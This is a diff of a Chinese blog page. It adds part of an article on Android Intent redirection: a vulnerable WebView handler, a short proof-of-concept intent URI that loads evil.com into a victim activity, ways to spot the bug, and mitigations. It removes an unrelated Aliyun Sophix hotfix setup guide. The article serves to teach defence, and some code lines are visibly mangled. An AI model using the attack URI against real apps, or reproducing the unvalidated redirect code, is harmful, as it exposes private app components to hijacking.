+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">shouldOverrideUrlLoading</span><span class="params">(WebView view, WebResourceRequest request)</span> &#123;</span><br><span class="line">    <span class="type">Uri</span> <span class="variable">uri</span> <span class="operator">=</span> request.getUrl();</span><br><span class="line"><span class="keyword">if</span>(<span class="string">&quot;intent&quot;</span>.equals(uri.getScheme())) &#123;</span><br><span class="line">        startActivity(Intent.parseUri(uri.toString(), Intent.URI_INTENT_SCHEME));</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">super</span>.shouldOverrideUrlLoading(view, request);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>要利用此漏洞，攻击者可以通过Intent.Uri方法创建一个WebView重定向Intent 的url，然后让WebViewActivity去加载该Url，由于在shouldOverrideUrlLoading方法中没有做完整的校验，会存在Intent重定向漏洞。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">intent.setClassName(<span class="string">&quot;com.victim&quot;</span>, <span class="string">&quot;com.victim.WebViewActivity&quot;</span>);i</span><br><span class="line">ntent.putExtra(<span class="string">&quot;url&quot;</span>, <span class="string">&quot;http://evil.com/&quot;</span>);</span><br><span class="line">Log.d(<span class="string">&quot;evil&quot;</span>, intent.toUri(Intent.URI_INTENT_SCHEME)); </span><br><span class="line"><span class="comment">//&quot;intent:#Intent;component=com.victim/.WebViewActivity;S.url=http%3A%2F%2Fevil.com%2F;end&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 攻击代码</span></span><br><span class="line">location.href = <span class="string">&quot;intent;component=com.victim/.WebViewActivity;S.url=http%3A%2F%2Fevil.com%2F;end&quot;</span>;</span><br></pre></td></tr></table></figure>
+</blockquote>
+<h2><span id="查看此类漏洞的方法">查看此类漏洞的方法</span></h2><blockquote>
+<p>如何在App中快速的找到此类漏洞呢？我们可以从以下三个方面入手:</p>
+<p>1.在App中查找导出组件，并且检查该组件是否接收从外部输入的Intent对象。</p>
+<p>2.在上述组件中查找对startActivity（或 startService 和 sendBroadcast）的调用，并验证其Intent组件是否是从受信任的数据对象来构造的。</p>
+<p>3.查找Intent 的 getExtras方法的调用，是否有将该方法的返回值强制转换为Intent；并在使用这种嵌入的Intent之前进行了完整的校验。</p>
+</blockquote>
+<h2><span id="漏洞缓解方法">漏洞缓解方法</span></h2><blockquote>
+<p>那么，如何缓解Intent重定向漏洞呢 ？</p>
+</blockquote>
+<h3><span id="方法1将受影响的应用组件设为专用组件">方法1：将受影响的应用组件设为专用组件。</span></h3><blockquote>
+<p>如果受影响的应用组件不需要接收来自其他应用的 Intent，可以将此应用组件设为专用组件，只需在清单中设置 android:exported&#x3D;“false” 即可。</p>
+</blockquote>
+<h3><span id="方法2确保提取的intent来自可信的来源">方法2：确保提取的Intent来自可信的来源。</span></h3><blockquote>
+<p>可以使用 getCallingActivity 等方法来验证源 Activity 是否可信。</p>
+<p>例如：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 检查源 Activity 是否来自可信的包名</span></span><br><span class="line"> <span class="keyword">if</span> (getCallingActivity().getPackageName().equals(“known”)) &#123;</span><br><span class="line">   <span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> getIntent();</span><br><span class="line">   <span class="comment">// 提取嵌套的 Intent</span></span><br><span class="line">   <span class="type">Intent</span> <span class="variable">forward</span> <span class="operator">=</span> (Intent) intent.getParcelableExtra(“key”);</span><br><span class="line">   <span class="comment">// 重定向嵌套的 Intent</span></span><br><span class="line">   startActivity(forward ) ;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
+
+<p>注意：检查 getCallingActivity() 是否返回非null值并不足以防范此漏洞。恶意App可以为此函数提供 null 值，最好加上APP的签名校验。</p>
+</blockquote>
+<h3><span id="方法3确保要重定向的intent是无害的">方法3：确保要重定向的Intent是无害的。</span></h3><blockquote>
+<p>需要先验证重定向的Intent，确保该 Intent</p>
+<p><strong>1.不会被发送到APP的任何专用组件</strong></p>
+<p><strong>2.不会被发送到外部应用的组件。如果重定向的目标是外部应用，请确保该 Intent 不会向APP的私有content provider授予URI权限。</strong></p>
+<p>在重定向 Intent 之前，应用可以先使用resolveActivity等方法检查将使用哪个组件来处理该 Intent。</p>
+<p>例如：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> getIntent();</span><br><span class="line"> <span class="comment">// 提取嵌套的 Intent</span></span><br><span class="line"> <span class="type">Intent</span> <span class="variable">forward</span> <span class="operator">=</span> (Intent) intent.getParcelableExtra(“key”);</span><br><span class="line"> <span class="comment">// 获取组件名称</span></span><br><span class="line"> <span class="type">ComponentName</span> <span class="variable">name</span> <span class="operator">=</span> forward.resolveActivity(getPackageManager());</span><br><span class="line"> <span class="comment">// 检查软件包名称和类名称是否符合预期</span></span><br><span class="line"> <span class="keyword">if</span> (name.getPackageName().equals(“safe_package”) &amp;&amp;</span><br><span class="line">     name.getClassName().equals(“safe_class”)) &#123;</span><br><span class="line">   <span class="comment">// 重定向嵌套的 Intent</span></span><br><span class="line">   startActivity(forward);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
+
+<p>App可以使用getFlags等方法来检查 Intent 是否会授予 URI 权限。应用还可以使用removeFlags撤消 URI 权限的授予。</p>
+<p>例如：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 提取嵌套的 Intent</span></span><br><span class="line"> <span class="type">Intent</span> <span class="variable">forward</span> <span class="operator">=</span> (Intent) intent.getParcelableExtra(“key”);</span><br><span class="line"> <span class="comment">// 获取标记</span></span><br><span class="line"> <span class="type">int</span> <span class="variable">flags</span> <span class="operator">=</span> forward.getFlags();</span><br><span class="line"> <span class="comment">// 检查嵌套的 Intent 不能授予 URI 读写权限</span></span><br><span class="line"> <span class="keyword">if</span> (( flags &amp; Intent.FLAG_GRANT_READ_URI_PERMISSION == <span class="number">0</span>) &amp;&amp;</span><br><span class="line">     (flags &amp; Intent.FLAG_GRANT_WRITE_URI_PERMISSION == <span class="number">0</span>)) &#123;</span><br><span class="line">    / / 重定向嵌套的 Intent</span><br><span class="line">       <span class="title function_">startActivity</span><span class="params">(forward)</span>;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
+</blockquote>
+<h2><span id="参考">参考</span></h2><blockquote>
+<p>[1] Intent Redirection Vulnerability <a target="_blank" rel="noopener" href="https://support.google.com/faqs/answer/9267555?hl=en">https://support.google.com/faqs/answer/9267555?hl=en</a></p>
+<p>[2] #272044 Android - Access of some not exported content providers<a target="_blank" rel="noopener" href="https://hackerone.com/reports/272044[3]">https://hackerone.com/reports/272044[3]</a> #200427 Access of Android protected components via embedded intent<a target="_blank" rel="noopener" href="https://hackerone.com/reports/200427[4]">https://hackerone.com/reports/200427[4]</a> Intent.toUri<a target="_blank" rel="noopener" href="https://developer.android.com/reference/android/content/Intent#toURI()">https://developer.android.com/reference/android/content/Intent#toURI()</a></p>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/Android/" rel="tag">Android</a><a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
+            </div>
+        
+
+    </section>
+</article>
   
     <article class="post ">
 
@@ -720,181 +969,6 @@
     </section>
 </article>
   
-    <article class="post ">
-
-    
-        <h2 class="title">
-            <a href="/2024/01/15/Aliyun-Sophix/">
-                阿里热修复Sophix的使用指南
-            </a>
-        </h2>
-    
-    <time>
-        Jan 15, 2024
-    </time>
-    <section class="content">
-        <h1><span id="阿里热修复sophix的使用指南">阿里热修复Sophix的使用指南</span></h1><blockquote>
-<p>本文转自<a target="_blank" rel="noopener" href="https://juejin.cn/post/7250377976134533177">五问</a> 并作补充</p>
-</blockquote>
-<h2><span id="一-阿里云热修复sophix的介绍">一、阿里云热修复Sophix的介绍</span></h2><h3><span id="11-首先看一下市场上热修复方案的比较">1.1、首先看一下市场上热修复方案的比较：</span></h3><blockquote>
-<p><a target="_blank" rel="noopener" href="https://help.aliyun.com/document_detail/434850.html">https://help.aliyun.com/document_detail/434850.html</a></p>
-<p><img src="/2024/01/15/Aliyun-Sophix/1.png" alt="image"></p>
-</blockquote>
-<h3><span id="12-收费情况">1.2、收费情况：</span></h3><blockquote>
-<p><a target="_blank" rel="noopener" href="https://help.aliyun.com/document_detail/434858.html">https://help.aliyun.com/document_detail/434858.html</a></p>
-<p><img src="/2024/01/15/Aliyun-Sophix/2.png" alt="image"></p>
-</blockquote>
-<h2><span id="二-接入指南">二、接入指南</span></h2><h3><span id="21-准备">2.1、准备</span></h3><blockquote>
-<ol>
-<li>准备好阿里云账号</li>
-<li>进行身份实名认证</li>
-<li><a href="https://link.juejin.cn/?target=https://help.aliyun.com/product/434086.html">移动研发平台EMAS</a>，进行项目创建,创建后会生成一个<code>aliyun-emas-services.json 文件</code>，里面包含了热修复sdk接入时所需的密钥，很重要</li>
-</ol>
-</blockquote>
-<h3><span id="22-emas平台的添加流程如下">2.2、EMAS平台的添加流程如下：</span></h3><h4><span id="221-添加应用">2.2.1、添加应用</span></h4><blockquote>
-<p><img src="/2024/01/15/Aliyun-Sophix/3.png" alt="image"></p>
-<p><img src="/2024/01/15/Aliyun-Sophix/4.png" alt="image"></p>
-<p>生成应用的key信息文件，如果建议按需接入所需功能，没必要也不安全，按下图将文件放入到app中</p>
-<p><img src="/2024/01/15/Aliyun-Sophix/5.png" alt="image"></p>
-<p>下图的红框中的添加sdk也是，添加emas平台中的所有功能，建议按需接入某个功能（如：热修），另外该插件在Android <code>gradle 7</code>之上会报错</p>
-<p><img src="/2024/01/15/Aliyun-Sophix/6.png" alt="image"></p>
-</blockquote>
-<h3><span id="23-热修复接入">2.3、热修复接入</span></h3><blockquote>
-<p><a target="_blank" rel="noopener" href="https://help.aliyun.com/document_detail/434883.html">https://help.aliyun.com/document_detail/434883.html</a></p>
-<p><strong>注意点如下：</strong></p>
-<p>使用<code>gradle plugin版本高于4.2时</code>，可能会自动开启资源优化。开启资源优化后，资源名称被混淆，会导致补丁工具在生成补丁时一直卡在”开始构建补丁…..”，无法正常解析apk包。<code>解决方案：在gradle.properties 中新增android.enableResourceOptimizations=false，</code>重新生成基线包和修复包，然后再生成补丁。</p>
-<p>密钥的使用推荐在<code>SophixStubApplication 中初始化</code>，而<code>不是在AndroidManifest文件中配置</code></p>
-<p>使用android studio打包生成apk时，要关闭instant run。</p>
-<p><a href="https://link.juejin.cn/?target=https://help.aliyun.com/document_detail/434885.htm%23h3-h2c-ysc-sto">queryAndLoadNewPatch方法</a>用来请求控制台发布的补丁包，会涉及设备信息读取，所以必须在用户同意隐私协议之后调用。另外用户可根据业务情况，酌情考虑是否打开此开关。</p>
-<p>但不可放在attachBaseContext中，否则无网络权限，建议放在主进程用户同意隐私协议之后的任意时刻。</p>
-<p>接入流程步骤如下：</p>
-<p><strong>添加工程依赖</strong></p>
-<h4><span id="1-android-studio集成方式">1. Android Studio集成方式</span></h4><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">gradle远程仓库依赖, 打开项目找到App的build.gradle文件，添加如下配置：</span><br><span class="line"></span><br><span class="line">添加Maven仓库地址：</span><br><span class="line"></span><br><span class="line">****</span><br><span class="line"></span><br><span class="line"><span class="string">``</span><span class="string">`</span></span><br><span class="line"><span class="string">repositories &#123;</span></span><br><span class="line"><span class="string">   maven &#123;</span></span><br><span class="line"><span class="string">       url &quot;http://maven.aliyun.com/nexus/content/repositories/releases&quot;</span></span><br><span class="line"><span class="string">   &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">`</span><span class="string">``</span></span><br></pre></td></tr></table></figure>
-
-<h4><span id="2添加gradle坐标版本依赖">2.添加gradle坐标版本依赖：</span></h4><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">android &#123;</span><br><span class="line">    ......</span><br><span class="line">    defaultConfig &#123;</span><br><span class="line">        applicationId <span class="string">&quot;com.xxx.xxx&quot;</span> <span class="comment">//包名</span></span><br><span class="line">        ......</span><br><span class="line">        ndk &#123;</span><br><span class="line">            <span class="comment">//选择要添加的对应cpu类型的.so库。</span></span><br><span class="line">            <span class="comment">//热修复支持五种</span></span><br><span class="line">            abiFilters <span class="string">&#x27;arm64-v8a&#x27;</span>, <span class="string">&#x27;armeabi&#x27;</span>, <span class="string">&#x27;armeabi-v7a&#x27;</span>, <span class="string">&#x27;x86&#x27;</span>, <span class="string">&#x27;x86_64&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        ......</span><br><span class="line">    &#125;</span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br><span class="line">dependencies &#123;</span><br><span class="line">    ......</span><br><span class="line">        compile <span class="string">&#x27;com.aliyun.ams:alicloud-android-hotfix:3.3.5&#x27;</span></span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h4><span id="3添加应用权限">3.添加应用权限</span></h4><p>Sophix SDK使用到以下权限，使用Maven依赖或者aar依赖可以不用配置。具体配置在AndroidManifest.xml中。</p>
-<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;uses-permission android:<span class="attr">name</span>=<span class="string">&quot;android.permission.INTERNET&quot;</span> /&gt;</span><br><span class="line">&lt;uses-permission android:<span class="attr">name</span>=<span class="string">&quot;android.permission.ACCESS_NETWORK_STATE&quot;</span> /&gt;</span><br><span class="line">&lt;uses-permission android:<span class="attr">name</span>=<span class="string">&quot;android.permission.ACCESS_WIFI_STATE&quot;</span> /&gt;</span><br><span class="line">&lt;uses-permission android:<span class="attr">name</span>=<span class="string">&quot;android.permission.READ_EXTERNAL_STORAGE&quot;</span>/&gt;</span><br></pre></td></tr></table></figure>
-
-<h4><span id="4配置androidmanifest文件">4.配置AndroidManifest文件</span></h4><p><code>也可以不用配置(直接在SophixStubApplication，文件中初始化配置即可（推荐在SophixStubApplication中配置）)</code>，在 <a href="https://link.juejin.cn/?target=https://help.aliyun.com/product/434086.html">移动研发平台EMAS</a>，进行项目创建,创建后会生成一个<code>aliyun-emas-services.json 文件</code>，里面包含了热修复sdk接入时所需的密钥</p>
-<p>在<code>AndroidManifest.xml</code>中间的<code>application</code>节点下添加如下配置：</p>
-<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta-data</span><br><span class="line">android:<span class="attr">name</span>=<span class="string">&quot;com.taobao.android.hotfix.IDSECRET&quot;</span></span><br><span class="line">android:<span class="attr">value</span>=<span class="string">&quot;App ID&quot;</span> /&gt;</span><br><span class="line">&lt;meta-data</span><br><span class="line">android:<span class="attr">name</span>=<span class="string">&quot;com.taobao.android.hotfix.APPSECRET&quot;</span></span><br><span class="line">android:<span class="attr">value</span>=<span class="string">&quot;App Secret&quot;</span> /&gt;</span><br><span class="line">&lt;meta-data</span><br><span class="line">android:<span class="attr">name</span>=<span class="string">&quot;com.taobao.android.hotfix.RSASECRET&quot;</span></span><br><span class="line">android:<span class="attr">value</span>=<span class="string">&quot;RSA密钥&quot;</span> /&gt;</span><br></pre></td></tr></table></figure>
-
-<h4><span id="5-混淆配置按需配置">5. 混淆配置,按需配置</span></h4><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">```</span><br><span class="line"><span class="meta">#基线包使用，生成mapping.txt</span></span><br><span class="line">-printmapping mapping.txt</span><br><span class="line"><span class="meta">#生成的mapping.txt在app/build/outputs/mapping/release路径下，移动到/app路径下</span></span><br><span class="line"><span class="meta">#修复后的项目使用，保证混淆结果一致</span></span><br><span class="line"><span class="meta">#-applymapping mapping.txt</span></span><br><span class="line"><span class="meta">#hotfix</span></span><br><span class="line">-keep <span class="keyword">class</span> <span class="title">com.taobao.sophix</span>.**&#123;*;&#125;</span><br><span class="line">-keep <span class="keyword">class</span> <span class="title">com.ta.utdid2.device</span>.**&#123;*;&#125;</span><br><span class="line"><span class="meta">#防止inline</span></span><br><span class="line">-dontoptimize</span><br><span class="line">```</span><br><span class="line">**</span><br><span class="line">**重要**</span><br><span class="line"></span><br><span class="line">开启混淆时，生成修复包要使用旧包的mapping文件以保证混淆结果一致。</span><br><span class="line">初始化</span><br></pre></td></tr></table></figure>
-
-<h4><span id="6-初始化">6. 初始化</span></h4><p>初始化的调用应该尽可能的早，必须在<code>Application.attachBaseContext()</code>的最开始（在super.attachBaseContext之后，如果有Multidex，也需要在Multidex.install之后）进行SDK初始化操作，初始化之前不能用到其他自定义类，否则极有可能导致崩溃。而查询服务器是否有可用补丁的操作可以在后面的任意地方。不建议在<code>Application.onCreate()</code>中初始化，因为如果带有ContentProvider，就会使得Sophix初始化时机太迟从而引发问题。</p>
-<p>Sophix最新版本引入了新的初始化方式。</p>
-<p>原来的初始化方式仍然可以使用。只是新方式可以提供更全面的功能修复支持，将会带来以下优点：</p>
-<ul>
-<li>初始化与应用原先业务代码完全隔离，使得原先真正的Application可以修复，并且减少了补丁预加载时间等等。</li>
-<li>新方式能够更完美地兼容Android 8.0以后版本。</li>
-</ul>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SophixStubApplication</span> <span class="keyword">extends</span> <span class="title class_">SophixApplication</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">TAG</span> <span class="operator">=</span> <span class="string">&quot;SophixStubApplication&quot;</span>;</span><br><span class="line">    <span class="type">String</span> <span class="variable">appVersion</span> <span class="operator">=</span> <span class="string">&quot;0.0.0&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 此处SophixEntry应指定真正的Application，并且保证RealApplicationStub类名不被混淆。</span></span><br><span class="line">    <span class="meta">@SophixEntry(MyApplication.class)</span></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">RealApplicationStub</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">attachBaseContext</span><span class="params">(Context base)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.attachBaseContext(base);</span><br><span class="line">        initSophix();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">initSophix</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            appVersion = <span class="built_in">this</span>.getPackageManager()</span><br><span class="line">                    .getPackageInfo(<span class="built_in">this</span>.getPackageName(), <span class="number">0</span>)</span><br><span class="line">                    .versionName;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">SophixManager</span> <span class="variable">instance</span> <span class="operator">=</span> SophixManager.getInstance();</span><br><span class="line">        List&lt;String&gt; tags = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        <span class="comment">///todo 构建正式包之前需要修改为：</span></span><br><span class="line">        <span class="comment">///tags.add(&quot;production&quot;);</span></span><br><span class="line">        tags.add(<span class="string">&quot;test&quot;</span>); <span class="comment">//这个值就是，你进行灰度包热修时，要填写的tag</span></span><br><span class="line">        <span class="keyword">for</span> (String tag : tags) &#123;</span><br><span class="line">            Log.e(TAG, <span class="string">&quot;sophix tag:&quot;</span> + tag);</span><br><span class="line">        &#125;</span><br><span class="line">        instance.setContext(<span class="built_in">this</span>)</span><br><span class="line">                .setAppVersion(appVersion)</span><br><span class="line">                .setEnableDebug(<span class="literal">false</span>)</span><br><span class="line">                .setEnableFullLog()</span><br><span class="line">                .setTags(tags)</span><br><span class="line">                .setSecretMetaData(<span class="string">&quot;你自己的hotfix.idSecret&quot;</span>,</span><br><span class="line">                        <span class="string">&quot;你自己的emas.appSecret&quot;</span>,</span><br><span class="line">                        <span class="string">&quot;你自己的hotfix.rsaSecret&quot;</span>)</span><br><span class="line">                .setPatchLoadStatusStub(<span class="keyword">new</span> <span class="title class_">PatchLoadStatusListener</span>() &#123;</span><br><span class="line">                    <span class="meta">@Override</span></span><br><span class="line">                    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onLoad</span><span class="params">(<span class="keyword">final</span> <span class="type">int</span> mode, <span class="keyword">final</span> <span class="type">int</span> code, <span class="keyword">final</span> String info, <span class="keyword">final</span> <span class="type">int</span> handlePatchVersion)</span> &#123;</span><br><span class="line">                        Log.e(TAG, <span class="string">&quot;sophix handlePatchVersion:&quot;</span> + handlePatchVersion + <span class="string">&quot; /code:&quot;</span> + code + <span class="string">&quot; /info:&quot;</span> + info);</span><br><span class="line">                        <span class="keyword">if</span> (code == PatchStatus.CODE_LOAD_SUCCESS) &#123;</span><br><span class="line">                            <span class="comment">///重启后会装载补丁会调用该方法</span></span><br><span class="line">                            Log.e(TAG, <span class="string">&quot;sophix load patch &quot;</span> + handlePatchVersion + <span class="string">&quot; success!&quot;</span> + info);</span><br><span class="line">                        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (code == PatchStatus.CODE_LOAD_RELAUNCH) &#123;</span><br><span class="line">                            <span class="comment">///补丁加载成功会调用该方法</span></span><br><span class="line">                            <span class="comment">// 如果需要在后台重启，建议此处用SharePreference保存状态。</span></span><br><span class="line">                            Log.e(TAG, <span class="string">&quot;sophix preload patch success. restart app to make effect. handlePatchVersion:&quot;</span> + handlePatchVersion);</span><br><span class="line">                          </span><br><span class="line">                            <span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">                            intent.putExtra(<span class="string">&quot;message&quot;</span>, <span class="string">&quot;恭喜你，成功接收到发送的广播&quot;</span> + PatchStatus.CODE_LOAD_RELAUNCH);</span><br><span class="line">                            intent.setAction(<span class="string">&quot;可使用重启广播重启&quot;</span>);</span><br><span class="line">                            sendBroadcast(intent);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;).initialize();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h4><span id="7最后需要把androidmanifest里面的application改为这个新增的sophixstubapplication类">7.最后，需要把AndroidManifest里面的application改为这个新增的SophixStubApplication类：</span></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;application</span><br><span class="line">        android:name=&quot;com.my.pkg.SophixStubApplication&quot;</span><br><span class="line">        ... ...&gt;</span><br><span class="line">        ... ...</span><br></pre></td></tr></table></figure>
-
-<p>这样便完成了新方式的初始化接入改造。</p>
-</blockquote>
-<h2><span id="三-热修复打差量包流程-热修控制台地址">三、热修复打差量包流程 热修控制台地址</span></h2><blockquote>
-<p><a target="_blank" rel="noopener" href="https://emas.console.aliyun.com/service/devTool/hotfix/patch">https://emas.console.aliyun.com/service/devTool/hotfix/patch</a></p>
-</blockquote>
-<h3><span id="31-找到热修界面添加应用">3.1、找到热修界面添加应用</span></h3><blockquote>
-<p>如下图：<strong>注意</strong>应用版本必须与你的<code>versionName</code>一致，否则会<code>导致后续下发查找不到差量包</code></p>
-<p><img src="/2024/01/15/Aliyun-Sophix/7.png" alt="image"></p>
-<p><img src="/2024/01/15/Aliyun-Sophix/8.png" alt="image"></p>
-</blockquote>
-<h3><span id="32-打差量包">3.2、打差量包</span></h3><blockquote>
-<p><a target="_blank" rel="noopener" href="https://help.aliyun.com/document_detail/434864.html">https://help.aliyun.com/document_detail/434864.html</a></p>
-<ol>
-<li>准备好SophixPatchTool_windows打包工具各版本打包工具如下:</li>
-</ol>
-<ul>
-<li><a target="_blank" rel="noopener" href="https://ams-hotfix-repo.oss-cn-shanghai.aliyuncs.com/SophixPatchTool_macos.zip">Mac版本打包工具下载</a></li>
-<li><a target="_blank" rel="noopener" href="https://ams-hotfix-repo.oss-cn-shanghai.aliyuncs.com/SophixPatchTool_windows.zip">Windows版本打包工具下载</a></li>
-<li><a target="_blank" rel="noopener" href="https://ams-hotfix-repo.oss-cn-shanghai.aliyuncs.com/SophixPatchTool_linux.zip">Linux版本打包工具地址</a></li>
-</ul>
-<ol>
-<li>打一个release的包</li>
-<li>再第2步的release包的基础上修改一些内容，在打一个release包</li>
-<li>利用工具开始打包，如下图</li>
-</ol>
-<p><strong>注意：</strong> 每次热修差量包的生成的基础包就是你上次发版后的包，并不是说你在进行第三次热修时，用第二次的热修包，作为基准包</p>
-<p><code>问题包：1.0-querelease-2022-12-07.apk，修复包：1.0-release-2022-12-07.apk</code></p>
-<p><img src="/2024/01/15/Aliyun-Sophix/9.png" alt="image"></p>
-<p><code>打开工具：</code></p>
-<p><img src="/2024/01/15/Aliyun-Sophix/10.png" alt="image"></p>
-<p><code>选择两个包填充</code></p>
-<p><img src="/2024/01/15/Aliyun-Sophix/11.png" alt="image"></p>
-<p><code>选择设置填好keystore</code></p>
-<p><img src="/2024/01/15/Aliyun-Sophix/12.png" alt="image"></p>
-<p><code>选择高级，默认如下图，强制冷启动就是补丁包下发后必须重启，建议勾选强制冷启动，为何：看下面解释</code></p>
-<p><img src="/2024/01/15/Aliyun-Sophix/13.png" alt="image"></p>
